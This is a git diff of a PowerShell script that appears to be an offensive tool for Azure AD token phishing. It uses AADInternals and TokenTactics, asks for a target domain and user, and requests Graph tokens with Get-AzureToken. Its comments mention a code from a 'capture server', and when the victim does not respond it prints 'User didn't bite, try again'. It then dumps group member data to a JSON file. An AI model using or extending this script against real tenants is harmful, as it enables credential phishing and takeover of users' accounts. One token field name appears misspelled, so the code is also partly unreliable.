@@ -12,10 +12,12 @@ param (
 if (-not (Get-Module -Name AADInternals -ListAvailable)) { Write-Output "Importing AADInternals";
     Import-Module AADInternals
 }
-# Version2 does not contain -CaptureCode $Token for some reason...
+
+# V2 does not contain -CaptureCode $Token for some reason...
 # if (-not (Get-Module -Name TokenTactics -ListAvailable)) { Write-Output "TokenTactics not found, importing V2 fork from project folder";
 #     Import-Module .\TokenTacticsV2\TokenTactics.psd1
 # }
+
 if (-not (Get-Module -Name TokenTactics -ListAvailable)) { Write-Output "TokenTactics not found, importing V1 from project folder";
     Import-Module .\TokenTactics\TokenTactics.psd1
 }
@@ -24,7 +26,10 @@ if (-not (Get-Module -Name TokenTactics -ListAvailable)) { Write-Output "TokenTa
 if(!($domain)){ Write-Output "Please specify target domain"; $domain = Read-Host; Write-Output "$domain selected" }
 if(!($user)){ Write-Output "Please specify target user"; $user = Read-Host; Write-Output "$user selected" } 
 
-Get-AzureToken -Client Graph 
+Get-AzureToken -Client Graph
+
+# V1: If you already have your token from a capture server defined as $Token
+# Get-AzureToken -Client Graph -CaptureCode $Token 
 
 if(!($response)){ Read-Host "User didn't bite, try again."} else {
 $access = $response.acess_token
@@ -90,8 +95,7 @@ $jsonData = $groupData | ConvertTo-Json
 # Save the JSON data to a file
 $jsonData | Out-File -FilePath "members.json"
 
-# # Attempt CAE token
-# Requires TokenTacticsV2 which won't let us pass a previously captured code, whole version 1 does.
+# Requires V2: Attempt CAE token
 # RefreshTo-MSGraphToken -UseCAE -Domain $domain
 # if ( $global:MSGraphTokenValidForHours -gt 23) { "MSGraph token is CAE capable, token is good for 24 hours. For more information: https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-continuous-access-evaluation " }
 
